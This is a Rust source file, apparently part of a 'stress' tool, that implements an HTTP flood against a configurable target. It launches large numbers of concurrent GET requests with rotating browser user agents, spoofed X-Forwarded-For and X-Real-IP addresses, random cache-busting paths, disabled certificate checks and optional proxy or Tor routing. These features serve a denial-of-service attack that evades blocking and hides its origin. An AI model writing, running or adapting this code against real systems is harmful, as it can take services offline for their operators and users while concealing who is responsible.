use anyhow::Result;
use futures::future::join_all;
use indicatif::{ProgressBar, ProgressStyle};
use rand::Rng;
use std::sync::Arc;
use std::time::{Duration, Instant};

use super::metrics::StressMetrics;
use super::{StressConfig, StressStats};
use crate::proxy::{ProxyEntry, ProxyManager, ProxyType};

pub async fn run_http_flood(config: &StressConfig, metrics: &StressMetrics) -> Result<StressStats> {
    let target_url = if config.payload_size > 0 {
        format!(
            "http://{}:{}/{}",
            config.target,
            config.port,
            generate_random_path(config.payload_size)
        )
    } else {
        format!("http://{}:{}", config.target, config.port)
    };

    let proxy_manager = if config.use_proxies {
        if let Some(ref proxy_file) = config.proxy_pool {
            let manager = ProxyManager::new(Default::default())?;
            manager.add_proxies_from_file(proxy_file).await?;
            Some(manager)
        } else {
            None
        }
    } else {
        None
    };

    let client = build_client(config, proxy_manager.as_ref()).await?;

    let progress = Arc::new(ProgressBar::new(config.duration_secs));
    progress.set_style(
        ProgressStyle::default_bar()
            .template(
                "{spinner:.red} [{elapsed_precise}] [{bar:40.red/yellow}] {pos}/{len}s - {msg}",
            )
            .unwrap_or_else(|_| ProgressStyle::default_bar())
            .progress_chars("=>-"),
    );

    let semaphore = Arc::new(tokio::sync::Semaphore::new(config.concurrency));
    let metrics = Arc::new(metrics.clone());
    let _start_time = Instant::now();

    metrics.start();

    let mut handles = Vec::new();
    let total_requests = config.rate_pps * config.duration_secs;
    let _requests_per_second = config.rate_pps;

    for _ in 0..total_requests {
        let permit = semaphore.clone().acquire_owned().await?;
        let client = client.clone();
        let url = target_url.clone();
        let metrics = metrics.clone();
        let _progress = progress.clone();

        let handle = tokio::spawn(async move {
            let _request_start = Instant::now();

            let result = client
                .get(&url)
                .header("User-Agent", random_user_agent())
                .header("Accept", "*/*")
                .header("Accept-Language", "en-US,en;q=0.9")
                .header("Cache-Control", "no-cache")
                .header("Pragma", "no-cache")
                .header("X-Forwarded-For", random_ip())
                .header("X-Real-IP", random_ip())
                .send()
                .await;

            match result {
                Ok(response) => {
                    let size = response.content_length().unwrap_or(0);
                    metrics.record_packet(size);
                }
                Err(_) => {
                    metrics.record_error();
                }
            }

            drop(permit);
        });

        handles.push(handle);
    }

    join_all(handles).await;

    progress.finish_and_clear();

    Ok(metrics.to_stats())
}

async fn build_client(
    config: &StressConfig,
    proxy_manager: Option<&ProxyManager>,
) -> Result<reqwest::Client> {
    let max_connections = config.concurrency.max(200);

    let mut builder = reqwest::Client::builder()
        .timeout(Duration::from_secs(30))
        .danger_accept_invalid_certs(true)
        .pool_max_idle_per_host(max_connections / 2)
        .pool_idle_timeout(Duration::from_secs(30))
        .connect_timeout(Duration::from_secs(5))
        .tcp_keepalive(Duration::from_secs(60))
        .tcp_nodelay(true);

    if let Some(proxy) = proxy_manager {
        if let Some(proxy_entry) = proxy.get_healthy_proxy().await {
            builder = builder.proxy(build_reqwest_proxy(&proxy_entry)?);
        }
    }

    Ok(builder.build()?)
}

fn build_reqwest_proxy(proxy: &ProxyEntry) -> Result<reqwest::Proxy> {
    let scheme = match proxy.proxy_type {
        ProxyType::Socks4 | ProxyType::Socks5 => "socks5",
        ProxyType::Http => "http",
        ProxyType::Https => "https",
        ProxyType::Tor => "socks5",
    };

    let proxy_url = format!("{}://{}:{}", scheme, proxy.address, proxy.port);

    let mut reqwest_proxy = reqwest::Proxy::all(&proxy_url)?;

    if let (Some(user), Some(pass)) = (&proxy.username, &proxy.password) {
        reqwest_proxy = reqwest_proxy.basic_auth(user, pass);
    }

    Ok(reqwest_proxy)
}

fn random_user_agent() -> String {
    let user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    ];

    let mut rng = rand::thread_rng();
    user_agents[rng.gen_range(0..user_agents.len())].to_string()
}

fn random_ip() -> String {
    let mut rng = rand::thread_rng();
    format!(
        "{}.{}.{}.{}",
        rng.gen_range(1..255),
        rng.gen_range(0..255),
        rng.gen_range(0..255),
        rng.gen_range(1..255)
    )
}

fn generate_random_path(length: usize) -> String {
    let chars: Vec<char> = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
        .chars()
        .collect();
    let mut rng = rand::thread_rng();

    (0..length)
        .map(|_| chars[rng.gen_range(0..chars.len())])
        .collect()
}
